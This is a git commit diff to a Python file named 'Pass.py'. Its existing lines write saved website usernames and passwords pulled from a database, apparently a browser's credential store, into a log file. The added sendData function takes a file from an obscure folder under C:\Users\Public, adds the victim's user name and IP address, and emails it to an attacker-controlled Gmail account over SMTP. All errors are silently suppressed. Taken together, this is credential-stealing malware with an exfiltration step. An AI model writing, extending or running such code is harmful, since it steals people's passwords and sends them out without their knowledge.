779a266470553025bb7e85817e6509b04abb402e
Luis Garcia Calzada <luisxciv@gmail.com>
2017-04-19 17:46:02 -0400

    .

--- Pass.py
+++ Pass.py
@@ -21,3 +21,42 @@ for result in cursor.fetchall():
         fp.write('\nThe website is '+result[0])
         fp.write('\nThe Username is '+result[1])
         fp.write('\n The password is ' + str(password))
+
+## lets send the file now 
+        def sendData(fname, fext):
+
+            attach = "C:\Users\Public\Intel\Logs" + '\\' + fname + fext
+
+            ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
+            SERVER = "smtp.gmail.com"
+            PORT = 465
+            USER = userkey
+            PASS = passkey
+            FROM = USER
+            TO = userkey
+            SUBJECT = "Attachment " + "From --> " + curentuser + " Time --> " + str(ts)
+            TEXT = "This attachment is sent from python" + '\n\nUSER : ' + curentuser + '\nIP address : ' + ip_address
+
+            message = MIMEMultipart()
+            message['From'] = FROM
+            message['To'] = TO
+            message['Subject'] = SUBJECT
+            message.attach(MIMEText(TEXT))
+
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(open(attach, 'rb').read())
+            Encoders.encode_base64(part)
+            part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
+            message.attach(part)
+
+            try:
+                server = smtplib.SMTP_SSL()
+                server.connect(SERVER, PORT)
+                server.ehlo()
+                server.login(USER, PASS)
+                server.sendmail(FROM, TO, message.as_string())
+                server.close()
+            except Exception as e:
+                pass
+
+            return True
